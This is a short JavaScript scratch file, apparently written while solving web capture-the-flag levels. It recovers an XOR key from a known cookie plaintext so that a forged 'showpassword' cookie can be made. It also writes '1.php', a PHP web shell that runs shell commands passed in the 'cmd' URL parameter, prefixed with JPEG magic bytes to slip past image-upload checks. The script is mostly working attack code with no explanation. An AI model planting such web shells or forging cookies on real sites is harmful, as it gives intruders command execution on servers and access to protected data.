const fs =require('fs');

function xor(str) {
    console.log(str)
    let key = "KNHL";
    let result = [];
    for (i = 0; i < str.length; i++) {
        result.push(str[i].charCodeAt(0) ^ key[i % key.length].charCodeAt(0));
    }
    return result;
}

const s = { showpassword: "no", "bgcolor": "#ffffff" };
const l = Buffer.from("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY", 'base64');

//console.log(Buffer.from(xor(JSON.stringify({ showpassword: "yes", "bgcolor": "#ffffff" }))).toString('base64'));

//const s1 = { showpassword: "yes", "bgcolor": "#ffffff" };
//const l1 = Buffer.from(JSON.stringify(s1), 'base64');


const b = Buffer.from('FFD8FFE0','hex');
const p = Buffer.from('<? passthru($_GET["cmd"]); ?>')
fs.writeFileSync('1.php', (Buffer.concat([b, p])));



//MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKy4qLSgubjY
//console.log(l.length);
//console.log(JSON.stringify(s).length);
/*
console.log(JSON.stringify(s));

console.log(l[0] ^ "{".charCodeAt(0));
console.log(l[1] ^ "\"".charCodeAt(0));
console.log(l[2] ^ "s".charCodeAt(0));
console.log(l[3] ^ "h".charCodeAt(0));
console.log(l[4] ^ "o".charCodeAt(0));
console.log(l[5] ^ "w".charCodeAt(0));

//console.log("{".charCodeAt(0));

let pass = "KNHL";
let result = "";
for (i = 0; i < l.length; i++) {
    result = result + String.fromCharCode(l[i] ^ pass[i % pass.length].charCodeAt(0));
    //if (l[0] ^ i == "{".charCodeAt(0)) {
    //console.log(i);
    //}
}
console.log(result);
*/